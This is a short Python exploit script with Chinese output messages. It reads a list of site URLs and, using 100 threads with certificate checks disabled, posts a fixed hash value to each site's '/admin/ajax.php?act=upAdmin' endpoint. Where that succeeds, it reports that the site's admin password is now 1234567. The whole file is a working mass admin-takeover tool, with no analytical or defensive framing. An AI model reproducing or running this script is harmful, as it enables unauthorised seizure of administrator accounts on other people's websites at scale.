#-*- conding:utf-8 -*-
import argparse, sys, requests, time, os, re, json
from multiprocessing.dummy import  Pool
requests.packages.urllib3.disable_warnings()

def exp(target):
    url =f"{target}/admin/ajax.php?act=upAdmin"
    cookies = {"PHPSESSID": "4912912756c73b6ad593601d516e19c4"}
    headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
               "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.62",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
               "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
               "X-REQUESTED-WITH": "XMLHttpRequest", "Connection": "close",
               "Content-Type": "application/x-www-form-urlencoded"}
    data = {"p":"a7549c5e0f627a4f3b14077333f0fa9c"}
    res = requests.post(url, headers=headers, data=data, timeout=10, verify=False).text
    if json.loads(res.encode("utf-8"))["code"] == 1:
        print(f'站点{target} --- {json.loads(res.encode("utf-8"))["msg"]}, 密码是1234567')


if __name__ == '__main__':
    file = sys.argv[1]
    url_list=[]
    with open(file, "r", encoding="utf-8") as f:
        for i in f.readlines():
            url = i.strip().replace("\n", "")
            url_list.append(url)
    mp = Pool(100)
    mp.map(exp, url_list)
    mp.close()
    mp.join()







